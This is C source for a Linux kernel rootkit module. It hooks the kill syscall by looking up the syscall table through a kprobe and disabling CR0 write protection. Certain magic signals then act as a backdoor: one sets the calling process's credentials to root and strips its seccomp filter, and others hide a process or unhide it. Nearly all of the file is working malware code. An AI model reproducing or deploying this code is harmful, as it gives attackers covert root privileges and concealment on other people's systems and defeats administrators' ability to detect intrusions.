#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <asm/special_insns.h>
#include <linux/kprobes.h>
#include <linux/kallsyms.h>
#include "process.h"

static inline void write_cr0_my(int);
void my_hook_kill(void);
void my_unregister_hook_kill(void);
typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
kallsyms_lookup_name_t my_kallsyms_lookup_name =NULL;

int noop_pre(struct kprobe *p ,struct pt_regs *regs);

static unsigned long __lkm_order;
typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
static t_syscall my_pre_sys_kill=NULL;
void write_cr0_my(int a){
  //Let's close the cr0 write protection
  unsigned long cr0;
  preempt_disable();
  //Only for this cpu core. Lock is not required.
  cr0=read_cr0();
  if(a==1){
    set_bit(X86_CR0_WP_BIT,&cr0);
  }else{
    clear_bit(X86_CR0_WP_BIT,&cr0);
  }
  asm volatile("mov %0,%%cr0": "+r"(cr0), "+m"(__lkm_order));
  preempt_enable();
  return ;
}
int noop_pre(struct kprobe *p ,struct pt_regs *regs){
  return 0;
}
static struct kprobe kp={
  .symbol_name="kallsyms_lookup_name",
};
asmlinkage int hook_tar_kill(const struct pt_regs *);
asmlinkage int hook_tar_kill(const struct pt_regs *pt){
  pid_t pid=(pid_t) pt->di;
  int sig=(int)pt->si;
  if(pid==0&&sig==65){
    struct cred *cred;
    printk(KERN_INFO "Grand root for pid: %d",current->pid);
    cred=(struct cred *)__task_cred(current);
    cred->uid.val=0;
    cred->suid.val=0;
    cred->euid.val=0;
    cred->fsuid.val=0;

    cred->gid.val=0;
    cred->sgid.val=0;
    cred->egid.val=0;
    cred->fsgid.val=0;

    //wait! We have to setup SELinux seccomp capbilities and so on. 
    current_thread_info()->syscall_work &= ~SYSCALL_WORK_SECCOMP;
    #ifdef CONFIG_SECCOMP
    current->seccomp.mode=0;
    current->seccomp.filter=NULL;
    #endif
    //Whose SELinux is enforcing? I won't do anything with it. Look at KernelSU/kernel/core_hook.c for SELinux
    return 0;
  }else if(pid==0&&sig==63){
    printk(KERN_INFO "Hide process for %d",current->pid);
    //Let's hide out process
    hide_pid(current->pid);
    return 0;
  }else if(pid==0&&sig==62){
    recover_hide_pid(current->pid);
    return 0;
  }else{
    //Let's call the real kill syscall but Do you know whether another LKM hook it? I don't know either.
    return (*my_pre_sys_kill)(pt);
  }
}
static unsigned long *__sys_call_table;
void my_hook_kill(void){
  register_kprobe(&kp);
  my_kallsyms_lookup_name=(kallsyms_lookup_name_t)kp.addr;
  unregister_kprobe(&kp);
  __sys_call_table=(unsigned long *)(my_kallsyms_lookup_name)("sys_call_table");
  if(!__sys_call_table){
    printk(KERN_INFO "Where is syscalls?");
    return ;
  }
  my_pre_sys_kill=(void *)(__sys_call_table[__NR_kill]);
  printk(KERN_INFO "Hook yes! %p",my_pre_sys_kill);
  write_cr0_my(0);
  __sys_call_table[__NR_kill]=(unsigned long)(hook_tar_kill);
  write_cr0_my(1);
  return ;
}

void my_unregister_hook_kill(void){
  write_cr0_my(0);
  __sys_call_table[__NR_kill]=(unsigned long )my_pre_sys_kill;
  write_cr0_my(1);
  return ;
}
